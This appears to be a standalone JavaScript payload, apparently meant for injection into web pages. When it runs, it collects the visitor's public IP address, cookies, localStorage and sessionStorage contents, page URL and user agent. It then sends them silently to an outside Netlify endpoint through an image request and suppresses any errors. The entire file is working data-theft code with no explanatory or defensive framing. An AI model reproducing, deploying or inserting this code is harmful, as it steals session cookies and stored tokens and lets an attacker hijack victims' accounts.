(async function () {
  try {
    const res = await fetch('https://api.ipify.org?format=json');
    const ipData = await res.json();
    const ip = ipData.ip;

    const data = {
      ip,
      cookies: document.cookie,
      localStorage: JSON.stringify(localStorage),
      sessionStorage: JSON.stringify(sessionStorage),
      url: location.href,
      origin: location.origin,
      userAgent: navigator.userAgent
    };

    const endpoint = 'https://scintillating-sfogliatella-a51761.netlify.app/';
    const qs = new URLSearchParams(data).toString();

    new Image().src = endpoint + '?' + qs;
  } catch (e) {}
})();
